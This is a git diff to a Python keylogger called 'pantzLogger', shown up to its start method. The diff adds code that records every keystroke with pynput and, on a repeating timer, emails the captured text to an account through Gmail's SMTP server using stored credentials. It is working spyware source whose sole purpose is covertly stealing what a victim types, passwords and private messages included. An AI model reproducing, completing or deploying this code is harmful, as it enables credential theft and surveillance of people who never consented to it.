@@ -1,31 +1,44 @@
 #!/usr/bin/env python
+import smtplib
+
 import pynput.keyboard
 import threading
 
-# global log variable in order not to send each letter
-log = ""
-
 
 class PaKey:
+    def __init__(self, time_to_report, email, password):
+        self.log = "pantzLogger is now on..."
+        self.interval = time_to_report
+        self.email = email
+        self.password = password
+
+    def append_to_log(self, string):
+        self.log = self.log + string
 
     # process to catch keystrokes
 
     def process_key_press(self, key):
-        global log
         try:
-            log = log + str(key.char)
+
+            self.append_to_log(key.char)
         except AttributeError:
             if key == key.space:
-                log = log + " "
+                self.log = self.log + " "
             else:
-                log = log + " " + str(key) + " "
+                self.log = self.log + " " + str(key) + " "
 
     def reporter(self):
-        global log
-        print(log)
-        log = ""
-        timer = threading.Timer(300, self.reporter)  # timer to count sec and internal call reporter for new
+        self.send_report_via_email(self.email, self.password, "\n\n" + self.log)
+        self.log = ""
+        timer = threading.Timer(self.interval, self.reporter)  # timer to count sec and internal call reporter for new
         timer.start()
+
+    def send_report_via_email(self, email, password, message):
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit
 
     def start(self):
         # in order to listen keystrokes from the keyboard
